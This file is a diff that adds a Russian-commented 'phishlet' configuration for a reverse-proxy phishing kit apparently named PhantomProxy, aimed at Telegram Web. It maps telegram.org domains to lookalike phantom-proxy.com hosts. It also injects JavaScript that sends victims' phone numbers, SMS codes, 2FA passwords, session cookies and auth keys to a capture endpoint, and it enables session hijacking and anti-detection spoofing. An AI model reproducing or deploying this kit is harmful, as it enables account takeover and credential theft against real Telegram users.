@@ -1,0 +1,239 @@
+# ============================================================================
+# Telegram Phishlet
+# Полный перехват сессий Telegram
+# ============================================================================
+
+id: telegram
+name: Telegram
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий Telegram Web:
+  - Вход по телефону
+  - SMS/Call код
+  - 2FA пароль
+  - Перехват сессий
+
+target:
+  primary: "web.telegram.org"
+  secondary:
+    - "webk.telegram.org"
+    - "webz.telegram.org"
+    - "a.telegram.org"
+    - "telegram.org"
+
+sub_filters:
+  - type: "domain"
+    from: "web.telegram.org"
+    to: "web.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "webk.telegram.org"
+    to: "webk.phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "webz.telegram.org"
+    to: "webz.phantom-proxy.com"
+    priority: 3
+
+  - type: "domain"
+    from: "telegram.org"
+    to: "phantom-proxy.com"
+    priority: 4
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Telegram phishlet loaded');
+    
+    const capture = {
+      capturePhone: function(phone) {
+        if (phone) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'telegram_phone',
+              phone: phone,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      captureCode: function(code) {
+        if (code && code.length >= 5) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'telegram_code',
+              code: code,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      capture2FA: function(password) {
+        if (password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'telegram_2fa',
+              password: password,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      captureSession: function() {
+        const cookies = {
+          al: this.getCookie('al'),
+          sid: this.getCookie('sid'),
+          stel_ssid: this.getCookie('stel_ssid')
+        };
+        
+        const authKey = localStorage.getItem('auth_key');
+        const userId = localStorage.getItem('user_id');
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'telegram_session',
+            cookies: cookies,
+            auth_key: authKey,
+            user_id: userId,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    // Перехват phone input
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT' && e.target.type === 'tel') {
+        if (e.target.value.length >= 10) {
+          clearTimeout(e.target._phantomTimeout);
+          e.target._phantomTimeout = setTimeout(() => {
+            capture.capturePhone(e.target.value);
+          }, 1500);
+        }
+      }
+    }, true);
+    
+    // Перехват code input
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT' && 
+          (e.target.name?.includes('phone_code') || e.target.placeholder?.includes('код'))) {
+        if (e.target.value.length >= 5) {
+          capture.captureCode(e.target.value);
+        }
+      }
+    }, true);
+    
+    // Перехват 2FA password
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT' && e.target.type === 'password') {
+        if (e.target.value.length > 0) {
+          clearTimeout(e.target._phantomTimeout);
+          e.target._phantomTimeout = setTimeout(() => {
+            capture.capture2FA(e.target.value);
+          }, 1000);
+        }
+      }
+    }, true);
+    
+    window.addEventListener('load', function() {
+      capture.captureSession();
+    });
+    
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+  })();
+
+triggers:
+  - name: "telegram_login"
+    path_regex: "/.*"
+    actions:
+      - type: "capture_form"
+        fields: ["phone", "phone_number", "phone_code", "password"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "telegram_code"
+    path_regex: "/.*"
+    actions:
+      - type: "capture_form"
+        fields: ["phone_code", "code", "hash"]
+      - type: "wait_for_input"
+        timeout: 300
+        
+  - name: "telegram_2fa"
+    path_regex: "/.*"
+    actions:
+      - type: "capture_form"
+        fields: ["password", "current_password", "2fa_password"]
+        
+  - name: "telegram_main"
+    host_regex: "web.telegram.org"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["al", "sid", "stel_ssid"]
+      - type: "capture_localstorage"
+        enabled: true
+      - type: "session_hijack"
+        enabled: true
+
+cookies:
+  critical:
+    - "al"
+    - "sid"
+    - "stel_ssid"
+    
+  session:
+    - "stel_webapp"
+    - "lang"
+    
+  additional:
+    - "push_auth"
+    - "debug"
+
+headers:
+  - "Authorization"
+  - "X-Telegram-API"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+  timezone_spoof: "UTC"
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+
+ssl:
+  min_version: "TLS1.2"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/telegram/"
